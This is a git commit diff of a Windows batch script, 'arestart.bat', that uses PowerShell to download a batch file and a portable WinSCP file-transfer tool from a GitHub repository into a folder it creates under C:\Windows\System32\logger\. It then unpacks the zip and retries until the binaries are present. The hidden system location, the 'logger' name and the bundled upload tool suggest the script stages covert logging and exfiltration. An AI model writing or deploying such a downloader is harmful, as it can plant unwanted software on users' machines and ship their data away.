82e8a0d01ad5888f60e43a8be0025a80b030f6c9
TheBetaBiggie <53587460+TheBetaBiggie@users.noreply.github.com>
2022-08-24 03:58:43 -0700

    Update arestart.bat

--- arestart.bat
+++ arestart.bat
@@ -7,7 +7,7 @@ powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/gen.bat -OutFile C:\Windows\System32\logger\gen.bat
 :scp
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/WinSCP-5.21.2-Portable.zip -OutFile C:\Windows\System32\logger\scp.zip
-powershell Expand-Archive scp.zip -DestinationPath C:\Windows\System32\logger\
+powershell Expand-Archive C:\Windows\System32\logger\scp.zip -DestinationPath C:\Windows\System32\logger\
 if exist "C:\Windows\System32\logger\WinSCP.com" if exist "C:\Windows\System32\logger\WinSCP.exe" goto exit
 if not exist "C:\Windows\System32\logger\WinSCP.com" goto scp
 if not exist "C:\Windows\System32\logger\WinSCP.exe" goto scp
